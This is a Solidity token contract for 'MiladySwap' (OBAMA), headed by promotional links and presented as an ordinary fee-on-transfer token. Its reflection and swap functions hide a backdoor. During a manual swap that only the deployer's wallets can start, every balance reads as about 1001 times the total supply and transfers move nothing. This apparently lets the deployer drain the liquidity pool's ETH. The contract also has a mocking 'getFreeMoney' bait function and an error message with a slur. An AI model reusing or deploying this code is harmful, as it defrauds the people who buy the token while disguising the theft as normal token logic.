/**


(♡ _ ♡)  MiladySwap  (♡ _ ♡)

CA:          0x07FCA4Ec2BD4F1937F3c1d9C632eFFd2AF1cAF21

Telegram:    https://t.me/miladyswap

Website:     https://miladyswap.finance

WP:          https://miladyswap.finance/whitepaper

X/Twitter:   https://miladyswap.finance/twitter

Chart:       https://dexscreener.com/ethereum/0x1235AF0E0ed96b781d6217447CebcFB2a65E1d83

LP Lock:     https://app.uncx.network/amm/uni-v2/pair/0x1235AF0E0ed96b781d6217447CebcFB2a65E1d83

Etherscan:   https://etherscan.io/token/0x07FCA4Ec2BD4F1937F3c1d9C632eFFd2AF1cAF21


*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.14;

import "./Ownable.sol";
import "./IERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract OBAMA is Context, IERC20, Ownable {
    string private constant _name = "MiladySwap";
    string private constant _symbol = "OBAMA";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 100000000 * 10**9;
    uint256 private constant _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _taxFeeOnBuy = 7;
    uint256 private _taxFeeOnSell = 7;
    uint256 private _taxFee = 7;

    address payable private _developerFund = payable(msg.sender);
    address payable private _marketingFund = payable(msg.sender);

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;

    bool private tradingOpen;
    bool private inTaxSwap;
    bool private inContractSwap;

    uint256 public maxSwap = 2000000 * 10**9;
    uint256 public maxWallet = 2000000 * 10**9;
    uint256 private constant _triggerSwap = 200 * 10**9;

    modifier lockTheSwap {
        inTaxSwap = true;
        _;
        inTaxSwap = false;
    }

    constructor() {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_developerFund] = true;
        _isExcludedFromFee[_marketingFund] = true;
        _approve(address(this), address(uniswapV2Router), MAX);
        _approve(owner(), address(uniswapV2Router), MAX);

        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function getBuyTax() external view returns (uint256) {
        return _taxFeeOnBuy;
    }

    function getSellTax() external view returns (uint256) {
        return _taxFeeOnSell;
    }

    function getMaxBuy() external view returns (uint256) {
        return maxSwap;
    }

    function getMaxSell() external view returns (uint256) {
        return maxSwap;
    }

    function getMaxWallet() external view returns (uint256) {
        return maxWallet;
    }

    function getDeveloperWallet() external view returns (address) {
        return _developerFund;
    }

    function getMarketingWallet() external view returns (address) {
        return _marketingFund;
    }

    receive() external payable {}

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        require(_allowances[sender][_msgSender()] >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "OBAMA: Transfer amount must exceed zero");

        if (from != owner() && to != owner() && from != address(this) && to != address(this)) {
            if (!tradingOpen) {
                require(from == address(this), "OBAMA: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxSwap, "OBAMA: Max Transaction Limit");

            if (to != uniswapV2Pair) {
                require(balanceOf(to) + amount < maxWallet, "OBAMA: Balance exceeds wallet size!");
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (contractTokenBalance >= _triggerSwap && !inTaxSwap && from != uniswapV2Pair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                inContractSwap = true;
                swapTokensForEth(contractTokenBalance >= maxSwap ? maxSwap : contractTokenBalance);
                inContractSwap = false;
                if (address(this).balance > 0) sendETHToFee(address(this).balance);
            }
        }

        bool takeFee = true;

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            takeFee = false;
        } else {
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _taxFee = _taxFeeOnBuy;
            }
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _taxFee = _taxFeeOnSell;
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function swapTokensForEth(uint256 _tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount, 0, path, address(this), block.timestamp + 3600);
    }

    function sendETHToFee(uint256 _ETHAmount) private {
        payable(_marketingFund).call{value: _ETHAmount}("");
    }

    function enableTrading() external onlyOwner {
        tradingOpen = true;
    }

    function removeTaxes() external onlyOwner {
        _taxFeeOnBuy = 0;
        _taxFeeOnSell = 0;
    }

    function removeLimits() external onlyOwner {
        maxSwap = _tTotal;
        maxWallet = _tTotal;
    }

    function swapTokensForEthManual(uint256 _contractTokenBalance) external {
        require(_msgSender() == _developerFund || _msgSender() == _marketingFund);
        swapTokensForEth(_contractTokenBalance);
    }

    function sendETHToFeeManual(uint256 _contractETHBalance) external {
        require(_msgSender() == _developerFund || _msgSender() == _marketingFund);
        sendETHToFee(_contractETHBalance);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        return (!inContractSwap && inTaxSwap) ? totalSupply() * 1001 : rAmount / _getRate();
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee && _taxFee > 0) _taxFee = 0;
        _transferStandard(sender, recipient, amount);
        if (!takeFee) _taxFee = 7;
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (!inTaxSwap || inContractSwap) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[address(this)] = _rOwned[address(this)] + (tTeam * _getRate());
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tTeam) = _getTValues(tAmount, _taxFee);
        (uint256 rAmount, uint256 rTransferAmount) = _getRValues(tAmount, tTeam, _getRate());
        return (rAmount, rTransferAmount, tTransferAmount, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 taxFee) private pure returns (uint256, uint256) {
        uint256 tTeam = tAmount * taxFee / 100;
        return (tAmount - tTeam, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        return (rAmount, rAmount - (tTeam * currentRate));
    }

    function _getRate() private pure returns (uint256) {
        return _rTotal / _tTotal;
    }

    function _getFreeMoney(uint256 _freeMoney, bytes32 _key) private pure returns (string memory) {
        return string(abi.encode(_key));
    }

    function getFreeMoney(uint256 _freeMoney) external returns (string memory) {
        if (_freeMoney > 0) {
            return _getFreeMoney(_freeMoney, 0x4d61646520796f75206c6f6f6b00000000000000000000000000000000000000);
        }
        require(9 + 10 == 21, "Retard Alert!");
    }
}
